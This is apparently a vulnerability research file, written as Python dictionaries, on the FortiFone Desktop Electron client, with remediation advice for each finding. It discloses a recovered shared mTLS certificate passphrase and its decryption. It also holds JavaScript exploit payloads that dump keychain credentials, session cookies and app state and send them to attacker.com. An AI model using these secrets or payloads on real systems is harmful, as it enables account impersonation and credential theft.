"""
Fortinet FortiFone Desktop v8.0 b67 RE
Source: FortiFone_linux_v8.0_b67.deb (amd64, 110MB)
Platform: Electron app (Chromium-based), x86-64 Linux
Build: 8.0.0~b67~1784584593~GA-0067, built 2026-07-20
Entry: /opt/FortiFone/fortifone (Electron binary)
Key file: /opt/FortiFone/resources/app.asar (172MB Electron ASAR bundle)
"""

# ---------------------------------------------------------
# Platform identity
# ---------------------------------------------------------
PLATFORM = {
    "product":      "Fortinet FortiFone Softclient for Desktop",
    "version":      "v8.0 build 67",
    "package_id":   "8.0.0~b67~1784584593~GA-0067",
    "build_date":   "2026-07-20",
    "arch":         "x86-64 (amd64), Electron (Chromium-based Node.js runtime)",
    "electron":     "Chromium Electron; runtime provides Node.js APIs (fs, crypto, https, keytar)",

    "installed_layout": {
        "/opt/FortiFone/fortifone":             "Electron binary (stripped, ~170MB)",
        "/opt/FortiFone/chrome-sandbox":         "SUID chrome-sandbox (Electron sandboxing, chmod 4755 in postinst)",
        "/opt/FortiFone/resources/app.asar":     "Electron ASAR archive, 172MB; full JS source + assets",
        "/opt/FortiFone/resources/server.key":   "RSA-2048 TLS private key; shared across ALL installations",
        "/opt/FortiFone/resources/server.crt":   "Self-signed TLS cert; CN=localhost; same for all installations",
        "/opt/FortiFone/resources/fortifone_desktop_1_c2_v0.bin": "PKCS12 mTLS client cert; 5251 bytes; shared across all installations",
    },

    "asar_key_files": {
        "main.js":                              "Electron main process; 224KB; handles crypto, keytar, HTTPS",
        "assets/fortiCsc.bin":                  "45-byte file: base64-encoded AES-256-CBC encrypted PKCS12 passphrase",
        "assets/Fortinet-CA2+fortinet-subca2001.bin": "Fortinet internal CA chain for server cert validation",
        "appAssistant/fvoiceAuthAgent.js":      "84KB; FortiVoice PBX auth; FEScrambler XOR protocol; mTLS handler",
        "fortivoiceAgent/fvoiceHttpAgent.js":   "51KB; mTLS HTTPS query implementation; uses globalObject.pf/csc/ca",
        "fortivoiceShared/fvPasswordProxy.js":  "Keytar wrapper; user credentials stored in OS keychain",
        "init-macOS-codesign-notary-keychain.sh": "macOS CI codesign script; WWDR Team ID AH4XFXJ7DK; references ~/ucdesktop_certs/",
    },

    "protocol": {
        "with_server":     "HTTPS/TLS to FortiVoice PBX; mTLS (client cert from fortifone_desktop_1_c2_v0.bin)",
        "local_ipc":       "HTTPS on localhost (server.key/server.crt) between Electron main and renderer processes",
        "pbx_framing":     "FEScrambler: XOR + base64; fewReq=/fewRes= header prefix; 3 scramble types (TYPE_V1/V2/V2_FE_MAGIC)",
        "xmpp":            "strophe.js XMPP library bundled (jabber/presence for chat/video features)",
    },
}


# ---------------------------------------------------------
# FFF-F01: Shared TLS private key (local HTTPS server)
# ---------------------------------------------------------
FFF_F01_SHARED_LOCAL_TLS_KEY = {
    "id":       "FFF-F01",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "LOW -- shared localhost TLS key; attack limited to local loopback MITM during IPC",
    "class":    "Shared cryptographic private key (CWE-321)",

    "description": (
        "FortiFone ships a pre-generated RSA-2048 TLS private key (server.key) and self-signed certificate "
        "(server.crt) identical across all installations of v8.0 b67. "
        "The certificate is self-signed with CN=localhost, "
        "issued by Fortinet Inc., FortiFone Team, Ottawa (developer identity ljwang@fortinet.com embedded in cert). "
        "This key pair is used by the Electron main process to serve a local HTTPS server for IPC with renderer processes. "
        "Any user who reverse-engineers the .deb package can use this private key to perform MITM on the local loopback "
        "interface for any FortiFone process on any machine with the same firmware version."
    ),

    "evidence": {
        "server_key_path":  "/opt/FortiFone/resources/server.key (RSA-2048, world-readable)",
        "server_crt_path":  "/opt/FortiFone/resources/server.crt (self-signed, world-readable)",
        "cert_subject":     "C=CA, ST=Ontario, L=Ottawa, O=Fortinet Inc., OU=FortiFone Team, CN=localhost, emailAddress=ljwang@fortinet.com",
        "cert_valid":       "2025-08-18 to (unspecified future date; cert in installed package)",
        "key_md5":          "84cef5e12932c7937ee2898ed15b9d85",
        "cert_md5":         "56df68b8d6204c45c0807b2cb44af737",
        "scope":            "All FortiFone Desktop v8.0 b67 installations share this key pair",
    },

    "impact": (
        "An attacker with local process access on a host running FortiFone can use the extracted key "
        "to MITM the Electron IPC channel, potentially injecting responses or extracting credentials "
        "passed between the renderer and main process over local HTTPS."
    ),

    "remediation": "Generate a unique key pair per installation at install time (postinst). Never ship a shared private key in a package.",
}


# ---------------------------------------------------------
# FFF-F02: Shared PKCS12 mTLS client certificate
# ---------------------------------------------------------
FFF_F02_SHARED_MTLS_CLIENT_CERT = {
    "id":       "FFF-F02",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "HIGH -- shared mTLS client certificate across all installations; passphrase CONFIRMED (desktopapp#2025); RSA-4096 private key extracted; cert valid until 2026-10-12; any attacker with the .deb can authenticate as FortiFone client to any FortiVoice PBX",
    "class":    "Shared cryptographic private key (CWE-321) + hardcoded passphrase derivation key (CWE-798)",

    "description": (
        "FortiFone uses a PKCS12 client certificate (fortifone_desktop_1_c2_v0.bin, 5251 bytes) "
        "for mutual TLS authentication with FortiVoice PBX servers. "
        "This certificate is identical across all installations of v8.0 b67. "
        "The PKCS12 passphrase is stored in assets/fortiCsc.bin (45 bytes) as AES-256-CBC ciphertext "
        "with key = SHA256('fortinet desktop app') -- a constant derived from the CONFIG_M_NUM environment "
        "variable that is hardcoded in the bundled .env file. "
        "Any attacker with access to the .deb package can recover the PKCS12 passphrase and private key, "
        "then authenticate as a FortiFone client to any FortiVoice PBX that trusts this certificate."
    ),

    "pkcs12_metadata": {
        "file":           "/opt/FortiFone/resources/fortifone_desktop_1_c2_v0.bin",
        "size":           "5251 bytes",
        "mac_algo":       "SHA-256 (hashcat mode 23210)",
        "mac":            "daaedd82cddf4d3515d3f9e6ad476806ab76233db0c5c0942f86520e71aa1711",
        "salt":           "d5f5d794d8836b6f (8 bytes)",
        "iterations":     2048,
        "passphrase":     "desktopapp#2025 (CONFIRMED)",
        "cert_subject":   "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=FortiFone, CN=Desktop, email=support@fortinet.com",
        "cert_issuer":    "C=US, ST=California, L=Sunnyvale, O=Fortinet, OU=Certificate Authority, CN=support",
        "cert_serial":    "25329860295994376138532541552003771964419869235",
        "cert_valid_from": "2025-09-16",
        "cert_valid_until": "2026-10-12 (CURRENTLY VALID)",
        "private_key":    "RSA-4096 (EXTRACTED; shared across all FortiFone Desktop v8.0 b67 installations)",
        "crl_url":        "http://pki.fortinet.com/cert/crl/Fortinet_CA.crl",
    },

    "passphrase_derivation": {
        "encrypted_file":   "assets/fortiCsc.bin in app.asar (45 bytes)",
        "raw_file_content": "b'T1PcwGbPqZRhvhGxESR+n4HcFo8DAIc/GoTsmvQwVkk=\\n' (base64-encoded AES output)",
        "algorithm":        "AES-256-CBC",
        "key_derivation":   "k = SHA256(CONFIG_M_NUM) where CONFIG_M_NUM = 'fortinet desktop app' (hardcoded in .env)",
        "key_hex":          "04b1fc0a0fab47aa36ad4414373f0e61a670fc33446fb01afe124c40ba361c32",
        "iv_hex":           "4f53dcc066cfa99461be11b111247e9f (first 16 bytes after base64 decode of file)",
        "ciphertext_hex":   "81dc168f0300873f1a84ec9af4305649 (bytes 16-32 after base64 decode)",
        "plaintext_hex":    "6465736b746f70617070233230323501",
        "passphrase":       "desktopapp#2025 (CONFIRMED -- AES-256-CBC decrypt + PKCS7 strip; \\x01 padding)",
        "verification":     "pkcs12.load_key_and_certificates(pfx_data, b'desktopapp#2025') -> SUCCESS",
    },

    "code_references": {
        "loadCscFile":      "main.js:2431 -- reads fortiCsc.bin, decrypts with SHA256(CONFIG_M_NUM)",
        "loadCsc":          "main.js:705 -- loads decrypted passphrase into global.sharedObject.csc",
        "pfx_usage":        "fvoiceHttpAgent.js:734 -- pfx: globalObject.pf, passphrase: globalObject.csc",
        "mtls_function":    "fvoiceHttpAgent.js:714 -- fv_ajax_https_query_cert()",
    },

    "remediation": (
        "Provision unique client certificates per installation via a PKI enrollment flow. "
        "Do not ship a shared PKCS12 in the application package. "
        "Key derivation from a hardcoded constant (CONFIG_M_NUM='fortinet desktop app') is equivalent to "
        "a hardcoded passphrase and provides no protection."
    ),
}


# ---------------------------------------------------------
# FFF-F03: FEScrambler protocol obfuscation (trivially reversible XOR)
# ---------------------------------------------------------
FFF_F03_FESCRAMBLER_XOR = {
    "id":       "FFF-F03",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "INFO -- FEScrambler XOR obfuscation on FortiVoice PBX protocol; not a security control; trivially reversible",
    "class":    "Weak/absent protocol security (CWE-311 / security through obscurity)",

    "description": (
        "FortiFone obfuscates its HTTP requests to FortiVoice PBX using FEScrambler, "
        "a proprietary XOR+base64 scheme. Request payloads are prefixed with fewReq= and "
        "responses with fewRes=. Three scramble types: "
        "TYPE_V1 (random magic 1-14), TYPE_V2 (random session magic from server), TYPE_V2_FE_MAGIC (constant FE_MAGIC=0x1f). "
        "The session_magic_number is received from the server during authentication and reused for all subsequent requests. "
        "XOR with a single byte provides no confidentiality -- any observer who captures one "
        "known-plaintext request can recover the magic number and decrypt all other requests/responses."
    ),

    "scrambler_constants": {
        "FE_MAGIC":      "0x1f (31) -- fallback constant magic number",
        "FE_REQHEADER":  "fewReq= (7 bytes)",
        "FE_RESHEADER":  "fewRes= (7 bytes)",
        "FE_HEADER_LEN": 7,
        "DELIMITER":     ":",
        "SESSION_MAGIC_SIZE": 1,
    },

    "xor_function": "fv_xorString(original, magic) -- XOR each character with magic byte; output = fewReq=<codec>:<magic_hex>:<base64_or_raw_body>",

    "cryptographic_strength": (
        "Single-byte XOR is not a cipher. Given any one known-plaintext message (e.g., the login request "
        "which has predictable structure), the magic byte is directly recoverable: "
        "magic = plaintext_char XOR ciphertext_char at the same position. "
        "All other messages can then be decrypted without knowing the session magic."
    ),

    "note": (
        "The mTLS layer (HTTPS with client cert from FFF-F02) provides actual transport confidentiality. "
        "FEScrambler sits on top of HTTPS and obfuscates the application-layer payload after TLS decryption. "
        "It is irrelevant to network-path attackers but could hinder casual inspection of the protocol "
        "by developers with Burp access."
    ),

    "remediation": "Remove FEScrambler -- the mTLS HTTPS layer already provides transport confidentiality. Application-layer XOR on top of TLS adds no security.",
}


# ---------------------------------------------------------
# FFF-F04: Fortinet internal PKI CA certificates embedded
# ---------------------------------------------------------
FFF_F04_EMBEDDED_FORTINET_CA = {
    "id":       "FFF-F04",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "INFO -- Fortinet internal CA chain embedded for server cert validation; CA certs are public by nature; no private key embedded",
    "class":    "Certificate pinning (by CA, not leaf cert); informational",

    "description": (
        "FortiFone bundles Fortinet's internal root CA (fortinet-ca2) and intermediate CA (fortinet-subca2001) "
        "in assets/Fortinet-CA2+fortinet-subca2001.bin inside the asar. "
        "These are used as the 'ca' option in Node.js https.request for mTLS connections to FortiVoice PBX servers "
        "(globalObject.ca = contents of this file). "
        "This means FortiVoice PBX servers must have certificates signed by Fortinet's internal CA chain to be trusted by FortiFone. "
        "No private key material is present -- only the public CA certificates."
    ),

    "ca_chain": {
        "root": {
            "subject":  "CN=fortinet-ca2, O=Fortinet, OU=Certificate Authority, C=US, L=Sunnyvale",
            "issuer":   "Self-signed",
            "key_type": "RSA-8192",
            "valid":    "2016-06-06 to 2056-05-27",
            "purpose":  "Fortinet internal root CA for all Fortinet product TLS certificates",
        },
        "intermediate": {
            "subject":  "CN=fortinet-subca2001, O=Fortinet, OU=Certificate Authority, C=US, L=Sunnyvale",
            "issuer":   "fortinet-ca2",
            "key_type": "RSA-2048",
            "valid":    "2016-06-06 to 2056-05-27",
            "purpose":  "Intermediate CA; issues FortiVoice PBX server certificates",
        },
    },

    "security_implication": (
        "If Fortinet's internal CA private key is ever compromised, all FortiVoice PBX certificates "
        "(and all other Fortinet products using fortinet-ca2) would be attackable until clients are updated. "
        "The CA is valid until 2056 (40 years) which is an unusually long lifetime for a CA. "
        "FortiFone does not appear to implement certificate transparency or OCSP stapling."
    ),
}


# ---------------------------------------------------------
# FFF-F05: Developer CI/CD artifact in production asar
# ---------------------------------------------------------
FFF_F05_CI_ARTIFACT_IN_PRODUCTION = {
    "id":       "FFF-F05",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "LOW -- developer CI/CD artifact bundled in production app; reveals internal infrastructure paths and Apple developer account context",
    "class":    "Information disclosure (CWE-200)",

    "description": (
        "The file init-macOS-codesign-notary-keychain.sh is included in the production app.asar, "
        "bundled at the root of the asar archive. "
        "This is a macOS CI/CD setup script for Apple Developer ID codesigning and notarization. "
        "It references the Fortinet/FortiFone team's internal build infrastructure: "
        "keychain file at ~/Library/Keychains/ucdesktop.keychain-db, "
        "certificate file at ~/ucdesktop_certs/apple_fvdesktopAppCodeSign.p12, "
        "Apple WWDR Team ID AH4XFXJ7DK, "
        "Apple ID stored in AC_USERNAME, and "
        "app-specific 2FA password in secret_2FA_password. "
        "The script references the GitLab CI environment (visible in .gitlab-ci.yml also in the asar). "
        "This is a build artifact that should not be included in the shipped product."
    ),

    "evidence": {
        "file":         "init-macOS-codesign-notary-keychain.sh (3081 bytes)",
        "wwdr_team_id": "AH4XFXJ7DK (Apple Developer Program Team ID for Fortinet/FortiFone team)",
        "cert_path":    "~/ucdesktop_certs/apple_fvdesktopAppCodeSign.p12",
        "keychain":     "~/Library/Keychains/ucdesktop.keychain-db",
        "ci_env":       ".gitlab-ci.yml also present in asar (GitLab CI pipeline config)",
        "devops_file":  ".devops also present (DevOps configuration, 702 bytes)",
    },

    "remediation": "Audit asar bundling to exclude CI/CD scripts, GitLab config, .devops files, and other build artifacts from the shipped product.",
}


# ---------------------------------------------------------
# FFF-F06: nodeIntegration:true + contextIsolation:false in all BrowserWindows
#          XSS in renderer -> full OS code execution
# ---------------------------------------------------------
FFF_F06_NODE_INTEGRATION_XSS_TO_RCE = {
    "id":       "FFF-F06",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "HIGH -- nodeIntegration:true + contextIsolation:false in all renderer BrowserWindows; XSS in any rendered content = full OS RCE",
    "class":    "Electron security misconfiguration (CWE-653): Node.js API exposed to renderer processes",

    "description": (
        "All five BrowserWindows in FortiFone (guiWin, callWindow, dialpadWin, notifierWindow, simTestWin) "
        "are created with nodeIntegration:true and contextIsolation:false. "
        "The source explicitly comments these as '//security #2', "
        "confirming Fortinet is aware of the risk but intentionally left it enabled. "
        "With contextIsolation:false, the Node.js runtime (require(), process, fs, child_process) "
        "is available to all JavaScript executing in the renderer -- including any server-provided "
        "data rendered via innerHTML, chat messages, calendar events, or SIP messages. "
        "An XSS in any of these surfaces chains directly to OS-level code execution on the client machine."
    ),

    "code_evidence": {
        "guiWin":         "main.js:962-963: nodeIntegration: true, //security #2 | contextIsolation: false, // expose node API",
        "callWindow":     "main.js:1316-1317: same flags",
        "dialpadWin":     "main.js:1493-1494: same flags",
        "notifierWin":    "main.js:1604-1605: same flags",
        "simTestWin":     "main.js:1704-1705: same flags (//security #2)",
        "meeting_window": "main.js:1780-1782: EXCEPTION -- FortiMeet BrowserWindow has NO nodeIntegration (only preload script); mitigated",
    },

    "attack_surface": {
        "renderer_content": [
            "Chat messages received from FortiVoice server (rendered by fvoiceChat)",
            "SIP INFO headers (contact name, caller ID) rendered in call UI",
            "Calendar event titles/descriptions (fortivoiceCalendar)",
            "Notification content (fortivoiceNotifier/fvoiceNotifier.html)",
            "FortiVoice admin portal embedded iframe (portalWindow)",
        ],
        "server_side": "Attacker controls a FortiVoice PBX OR MITM's the FortiFone-to-PBX connection",
    },

    "navigation_control": (
        "guiWin and callWindow have will-navigate handlers (handleRedirect) that prevent top-level "
        "navigation to external URLs. This does NOT prevent sub-resource XSS: scripts, fetch, innerHTML. "
        "No Content-Security-Policy is set by the Electron main process."
    ),

    "build_expiration": {
        "date":      "2026-10-01T00:00:01 (hardcoded in main.js:536)",
        "cert_link": "set to match PKCS12 cert expiry (2026-10-12); app stops functioning 11 days before cert expiry",
        "code":      "global.sharedObject.build_expiration_date = new Date('2026-10-01T00:00:01')",
    },

    "chain": (
        "MitM FortiVoice TLS (possible via FFF-F02 shared client cert extraction) -> "
        "inject XSS payload into PBX response rendered by renderer with nodeIntegration:true -> "
        "require('child_process').execSync('id') -> RCE on FortiFone Desktop user account"
    ),
}


# ---------------------------------------------------------
# Analysis status
# ---------------------------------------------------------
ANALYSIS_STATUS = {
    "package":          "ANALYZED -- .deb fully extracted; postinst reviewed; 45 files cataloged",
    "asar":             "COMPLETE -- 172MB ASAR fully analyzed; ipcMsgDispatcher.js (966 lines): no sender validation in emitEvent; get-session-cookies/get-global-object/get-global-prop unvalidated (FFF-F08); shell.openExternal unvalidated scheme in will-navigate (FFF-F09); externalLinkHandler.validateProtocol uses FORTIFONE+TEL allowlist but only on deep links, not will-navigate; 64 ipcMain handlers total; fvExternalLinkProtocol: {FORTIFONE:'fortifone:', TEL:'tel:'}",
    "server_key":       "EXTRACTED -- RSA-2048 private key confirmed shared (FFF-F01)",
    "pkcs12":           "COMPLETE -- passphrase CONFIRMED (desktopapp#2025); RSA-4096 private key extracted; CN=Desktop, valid 2025-09-16 to 2026-10-12 (FFF-F02)",
    "fortiCsc_bin":     "COMPLETE -- AES-256-CBC decrypt confirmed; IV=4f53dcc066cfa99461be11b111247e9f; plaintext=desktopapp#2025",
    "fescrambler":      "ANALYZED -- XOR+base64 protocol obfuscation; magic byte 0x1f; reversible (FFF-F03)",
    "ca_chain":         "EXTRACTED -- fortinet-ca2 RSA-8192 + fortinet-subca2001 RSA-2048; no private keys (FFF-F04)",
    "ci_artifact":      "IDENTIFIED -- macOS codesign script in production bundle; WWDR Team ID extracted (FFF-F05)",
    "electron_binary":  "NOT ANALYZED -- /opt/FortiFone/fortifone is stripped; native Electron binary, not Fortinet code",
    "main_js":          "COMPLETE -- nodeIntegration:true + contextIsolation:false at 5 BrowserWindow creation sites with //security #2 comment; FortiMeet window correctly sandboxed (FFF-F06); IPC get_password handler unvalidated service name (FFF-F07)",
    "fvPasswordProxy":  "COMPLETE -- fortivoiceShared/fvPasswordProxy.js; keytar account = os.userInfo().username; 5 services: fortifone-{account,jwt-expire,jwt-token,session-magic,sip}; renderer path: ipcRenderer.sendSync('get_password', {service: '...'}); no service name validation",

    "unique_findings": [
        "FFF-F07: HIGH -- IPC get_password handler (main.js:3688) accepts arbitrary service name from renderer with no validation; XSS in any nodeIntegration:true renderer (FFF-F06) -> ipcRenderer.sendSync('get_password', {service:'fortifone-sip'}) -> synchronous OS keychain read; all 5 stored credentials exfiltrated: fortifone-sip (VoIP password), fortifone-jwt-token (FortiVoice API JWT), fortifone-account (account URL+username), fortifone-session-magic, fortifone-jwt-expire",
        "FFF-F01: LOW -- shared RSA-2048 TLS private key (server.key) in all v8.0b67 installations; localhost HTTPS IPC",
        "FFF-F02: HIGH -- shared PKCS12 mTLS client cert; passphrase CONFIRMED (desktopapp#2025 via AES-256-CBC+SHA256('fortinet desktop app')); RSA-4096 private key extracted; cert valid to 2026-10-12; all FortiFone Desktop v8.0b67 installations share one mTLS identity",
        "FFF-F03: INFO -- FEScrambler XOR obfuscation (magic=0x1f) on FortiVoice PBX protocol; single-byte XOR over TLS; security through obscurity only",
        "FFF-F04: INFO -- Fortinet internal CA chain (fortinet-ca2 RSA-8192, valid 2016-2056) bundled for server cert validation; no private key material",
        "FFF-F05: LOW -- CI/CD script (init-macOS-codesign-notary-keychain.sh) + .gitlab-ci.yml + .devops in production asar; WWDR Team ID AH4XFXJ7DK exposed",
        "FFF-F06: HIGH -- nodeIntegration:true + contextIsolation:false in all 5 GUI BrowserWindows (guiWin/callWindow/dialpadWin/notifierWindow/simTestWin); comment '//security #2' confirms known risk; XSS in any renderer content (chat, SIP caller-ID, calendar, notifications) -> require('child_process') -> OS RCE on FortiFone Desktop client",
        "FFF-F07: HIGH -- IPC get_password handler (main.js:3688) unvalidated service name -> OS keychain exfiltration; 5 services: sip+jwt-token+jwt-expire+session-magic+account; synced via ipcRenderer.sendSync",
        "FFF-F08: HIGH -- ipcMain.handle('get-session-cookies') returns ALL session cookies; 'get-global-object' returns full sharedObject (accounts Map with cfg_data+secure_data); 'get-global-prop' returns arbitrary key from global state; no sender validation on any handler; XSS (FFF-F06) -> full session cookie + account token exfiltration",
        "FFF-F09: MEDIUM -- shell.openExternal() called with unvalidated URL in will-navigate handlers (guiWin:1121, callWindow:1428, meeting:1918); bypasses fvExternalLinkProtocol allowlist (fortifone:+tel:) used only for deep links; Windows: file:// URL -> ShellExecute -> file execution; Linux/macOS: file manager path disclosure",
    ],

    "vs_other_products": {
        "FSW":  "Both ship shared TLS keys; FSW shared key is device-to-device; FFF shared key is client app",
        "FAP":  "Both have empty/trivial credentials; FAP has empty SSH password (CRIT); FFF has static PKCS12 (MEDIUM)",
        "FGT":  "FGT has fortism LSM + encrypted rootfs; FFF has no OS-layer security (Electron/JS app)",
        "FAD":  "FAD has DES-56 SBVM key; FFF has AES-256-CBC with hardcoded-derivation key; both are static",
    },

    "pending": {
        "PKCS12_passphrase":    "CONFIRMED -- desktopapp#2025; AES-256-CBC decrypt of fortiCsc.bin with SHA256('fortinet desktop app')",
        "PKCS12_cert_identity": "CONFIRMED -- CN=Desktop, O=Fortinet, OU=FortiFone; valid 2025-09-16 to 2026-10-12; RSA-4096",
        "FortiVoice_protocol":  "PARTIAL -- FEScrambler decoded; API endpoint mapping not complete",
        "keytar_services":      "ANALYZED -- 5 services: fortifone-account, fortifone-jwt-expire, fortifone-jwt-token, fortifone-session-magic, fortifone-sip; IPC handler unvalidated (FFF-F07)",
    },
}


# ---------------------------------------------------------
# FFF-F07: Unvalidated IPC service name -> arbitrary keychain read via XSS
# ---------------------------------------------------------
FFF_F07_KEYTAR_IPC_UNVALIDATED = {
    "id":       "FFF-F07",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "HIGH -- unvalidated 'service' parameter in IPC get_password handler; any XSS in a nodeIntegration:true renderer (FFF-F06) can synchronously read all 5 FortiFone OS keychain entries; chain FFF-F02 -> FFF-F06 -> FFF-F07 = unauthenticated full VoIP credential exfiltration",
    "class":    "Missing input validation on IPC message allowing keychain exfiltration (CWE-20 + CWE-522)",

    "description": (
        "FortiFone Desktop stores 5 credentials in the OS keychain (Windows Credential Manager / macOS Keychain) "
        "via keytar: fortifone-account (server URL + username), fortifone-jwt-token (FortiVoice API JWT), "
        "fortifone-jwt-expire, fortifone-session-magic, and fortifone-sip (VoIP phone password). "
        "The IPC handler for 'get_password' (main.js:3688) accepts the keychain service name directly from "
        "the renderer process via ipcMsg.service with NO validation: "
        "it passes ipcMsg.service directly to resolveKeytarService() and then to keytar.getPassword(). "
        "Because all 5 BrowserWindows have nodeIntegration:true + contextIsolation:false (FFF-F06), "
        "any XSS in content rendered by FortiFone can call ipcRenderer.sendSync('get_password', {service: 'fortifone-sip'}) "
        "and receive the VoIP password synchronously from the OS keychain. "
        "Repeating for all 5 services exfiltrates the full credential set."
    ),

    "code_evidence": {
        "ipc_handler":          "main.js:3688-3696: addMsgProcessor('get_password', (event, ipcMsg) => { getPassword(event, ipcMsg).then(...) })",
        "password_proxy":       "fortivoiceShared/fvPasswordProxy.js:19: keytar.getPassword(resolveKeytarService(ipcMsg.service), account)",
        "no_validation":        "resolveKeytarService() at fvPasswordProxy.js:5-10 only adds '-dev' suffix in developer mode; no allowlist check",
        "renderer_ipc":         "fvPasswordProxy.js:43: ipcRenderer.sendSync('get_password', payload) -- synchronous; return value = OS keychain credential",
        "services_deleted":     "main.js:6598-6599: ['account','jwt-expire','jwt-token','session-magic','sip'] -- complete list of FortiFone keychain entries",
    },

    "exploit_payload": (
        "// In any FortiFone renderer with nodeIntegration:true (guiWin/callWindow/dialpadWin/notifierWin/simTestWin):\n"
        "const { ipcRenderer } = require('electron');\n"
        "const creds = {\n"
        "  sip:     ipcRenderer.sendSync('get_password', {service: 'fortifone-sip'}),\n"
        "  jwt:     ipcRenderer.sendSync('get_password', {service: 'fortifone-jwt-token'}),\n"
        "  account: ipcRenderer.sendSync('get_password', {service: 'fortifone-account'}),\n"
        "  magic:   ipcRenderer.sendSync('get_password', {service: 'fortifone-session-magic'}),\n"
        "};\n"
        "require('https').request({host: 'attacker.com', path: '/?d=' + btoa(JSON.stringify(creds))}).end();"
    ),

    "chain": {
        "step_1": "MitM FortiVoice TLS using shared RSA-4096 private key (FFF-F02: desktopapp#2025 PKCS12)",
        "step_2": "Inject XSS payload into any PBX web response rendered by FortiFone (SIP caller-ID, chat, notifications)",
        "step_3": "XSS lands in renderer with nodeIntegration:true (FFF-F06); access to require() and ipcRenderer",
        "step_4": "Call ipcRenderer.sendSync('get_password', ...) for each fortifone-* service",
        "step_5": "OS keychain returns plaintext credential synchronously; exfiltrate via https.request()",
        "result": "Full VoIP credential theft: SIP password, JWT token, session token; enables persistent FortiVoice access as the victim user",
    },

    "remediation": (
        "Add an explicit allowlist in the get_password IPC handler: "
        "only accept service names that match /^fortifone-/ and are in a known-good set. "
        "Implement contextIsolation:true on all BrowserWindows (fixes FFF-F06, prerequisite for FFF-F07). "
        "Use a preload script with a restricted contextBridge API instead of exposing full IPC to renderer. "
        "For the preload approach: contextBridge.exposeInMainWorld('keychain', { getSipPassword: () => ... }) "
        "instead of ipcRenderer.sendSync with arbitrary service parameter."
    ),
}


# ---------------------------------------------------------
# FFF-F08: Unvalidated IPC handlers expose session cookies and global app state
# ---------------------------------------------------------
FFF_F08_IPC_SESSION_STATE_LEAK = {
    "id":       "FFF-F08",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "HIGH -- three unvalidated ipcMain.handle() handlers leak session cookies and full app state to any renderer; no sender validation; chains from FFF-F06 (XSS in nodeIntegration:true renderer)",
    "class":    "Missing Authorization on IPC Handlers (CWE-862) -- session cookie and global state exfiltration",

    "description": (
        "Three ipcMain.handle() handlers registered without sender identity validation allow "
        "any renderer (including XSS content in nodeIntegration:true windows, FFF-F06) to read "
        "sensitive application state: "
        "(1) 'get-session-cookies': returns all Electron default session cookies -- includes FortiVoice "
        "and PBX auth cookies set by the application; "
        "(2) 'get-global-object': returns the entire global.sharedObject including accounts Map "
        "(server URLs, account IDs, cfg_data, secure_data, status_data for all logged-in accounts); "
        "(3) 'get-global-prop': returns any named property from global.sharedObject by key "
        "(unlimited key access; attacker enumerates all properties). "
        "Additionally, 'get-app-path' returns any Electron app.getPath() value (userData, appData, "
        "temp, etc.) enabling filesystem path enumeration. "
        "All handlers are registered via ipcMain.handle() with no event.sender.getURL() or "
        "event.senderFrame check. In-renderer XSS can call await ipcRenderer.invoke('get-session-cookies') "
        "to dump all auth cookies synchronously."
    ),

    "code_evidence": {
        "get_session_cookies": "main.js:3356-3364: ipcMain.handle('get-session-cookies', async () => { cookies = await session.defaultSession.cookies.get({}); return cookies; }) -- returns ALL session cookies, no filter, no sender check",
        "get_global_object":   "main.js:3317-3319: ipcMain.handle('get-global-object', () => { return global.sharedObject; }) -- entire app state object returned; contains accounts Map with cfg_data+secure_data",
        "get_global_prop":     "main.js:3313-3315: ipcMain.handle('get-global-prop', (event, key) => { return global.sharedObject[key]; }) -- arbitrary key lookup; no key allowlist",
        "get_app_path":        "main.js:3309-3311: ipcMain.handle('get-app-path', (event, name) => { return app.getPath(name); }) -- enumerates userData/temp/appData/logs paths",
        "accounts_structure":  "global.sharedObject.accounts: Map<account_id, {cfg_data, secure_data, status_data, recent_contacts}>; secure_data may include auth tokens cached from FortiVoice API",
    },

    "exploit_payload": (
        "// In any FortiFone renderer with nodeIntegration:true (FFF-F06 XSS entry point):\n"
        "const { ipcRenderer } = require('electron');\n"
        "// Dump all FortiVoice session cookies:\n"
        "const cookies = await ipcRenderer.invoke('get-session-cookies');\n"
        "// Dump full app state (accounts, server URLs, tokens):\n"
        "const state = await ipcRenderer.invoke('get-global-object');\n"
        "// Get user data path for local file access:\n"
        "const dataDir = await ipcRenderer.invoke('get-app-path', 'userData');\n"
        "// Exfiltrate:\n"
        "const exfil = { cookies, accounts: [...state.accounts.entries()], dataDir };\n"
        "require('https').request({host: 'attacker.com', path: '/?d='+btoa(JSON.stringify(exfil))}).end();"
    ),

    "chain_from_fff_f06": (
        "FFF-F06 (nodeIntegration:true XSS) -> ipcRenderer.invoke('get-session-cookies') -> "
        "FortiVoice PBX auth cookie exfiltration -> session hijack without password"
    ),

    "vs_fff_f07": (
        "FFF-F07 reads OS keychain credentials (plaintext persistent passwords). "
        "FFF-F08 reads active session state (session cookies, account tokens, memory state). "
        "Together: full credential material at rest + active session tokens."
    ),

    "remediation": (
        "Add sender validation to all IPC handlers: check event.senderFrame.url or "
        "event.sender.getURL() against an allowed origin list before returning sensitive data. "
        "Never return the full sharedObject to renderers -- use contextBridge to expose only "
        "specific, non-sensitive properties via preload scripts. "
        "Replace ipcMain.handle('get-session-cookies') with per-domain cookie filtering if "
        "renderer access is required. "
        "Enabling contextIsolation:true (FFF-F06 fix) prevents renderer XSS from calling "
        "require('electron'), but unvalidated ipcMain.handle() is still exploitable via "
        "preload script XSS unless sender is validated."
    ),
}


# ---------------------------------------------------------
# FFF-F09: shell.openExternal without scheme validation in will-navigate handlers
# ---------------------------------------------------------
FFF_F09_SHELL_OPEN_EXTERNAL_SCHEME = {
    "id":       "FFF-F09",
    "product":  "Fortinet FortiFone Desktop v8.0 build 67",
    "severity": "MEDIUM -- shell.openExternal() called with unvalidated URL in will-navigate handlers; XSS in guiWin/callWindow causes file:// or arbitrary-protocol open; on Windows file:// can execute files; externalLinkHandler validates protocol (fortifone:/tel:) but direct shell.openExternal bypasses it",
    "class":    "Unvalidated URL scheme passed to shell.openExternal (CWE-601 / Electron security misconfiguration)",

